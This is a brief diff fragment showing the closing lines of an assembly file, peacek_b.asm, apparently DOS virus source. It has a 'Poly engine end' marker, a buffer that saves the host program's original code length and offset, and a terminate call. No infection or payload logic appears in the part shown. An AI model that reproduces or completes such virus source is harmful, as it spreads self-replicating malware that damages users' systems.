+; ƒƒƒƒƒƒƒ Poly engine end ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+code_end:
+data_buffe:
+	     dw      02h		 ; Length of original code
+	     dw      code_begin-100h	 ; Offset of original code - 100h
+	     int     20h		 ; Terminate program
+
+	     db      0fah dup(?)
+data_buffe_:
+data_end:
+
+end	     code_begin
+ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[peacek_b.asm]ƒƒ
+
+
+
+
